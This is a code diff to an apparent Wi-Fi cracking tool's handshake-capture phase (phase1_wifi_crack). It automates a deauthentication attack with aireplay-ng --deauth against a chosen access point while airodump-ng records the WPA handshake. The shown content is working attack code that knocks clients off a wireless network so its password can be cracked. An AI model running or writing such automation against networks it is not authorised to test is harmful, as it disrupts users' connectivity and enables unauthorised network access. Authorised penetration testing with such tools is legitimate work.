@@ -602,18 +602,29 @@ def phase1_wifi_crack() -> PhaseResult:
                 f"[bold white]Interface :[/bold white] {iface}\n"
                 f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                 f"[bold white]Channel   :[/bold white] {channel}\n"
-                f"[bold white]Duration  :[/bold white] 60 s\n\n"
-                f"[yellow]Open a second terminal and run:[/yellow]\n"
-                f"[bold cyan]sudo aireplay-ng --deauth 10 -a {bssid} {iface}[/bold cyan]",
+                f"[bold white]Duration  :[/bold white] 60 s\n"
+                f"[bold white]Deauth    :[/bold white] [green]auto — firing in 3 s[/green]",
                 title="[bold cyan] Capturing Handshake [/bold cyan]",
                 border_style="cyan", expand=False,
             ))
 
-            run_cmd(
-                f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
-                f"-w {cap} {iface} 2>/dev/null",
-                timeout=75, capture=False,
+            # Launch deauth in background; 3-second sleep lets airodump-ng
+            # initialise before the first packet is fired.
+            deauth_proc = subprocess.Popen(
+                f"sudo sh -c 'sleep 3 && aireplay-ng --deauth 20 -a {bssid} {iface}'",
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
+            try:
+                run_cmd(
+                    f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
+                    f"-w {cap} {iface} 2>/dev/null",
+                    timeout=75, capture=False,
+                )
+            finally:
+                if deauth_proc.poll() is None:
+                    deauth_proc.terminate()
 
             cap_file = f"{cap}-01.cap"
             if not os.path.exists(cap_file):
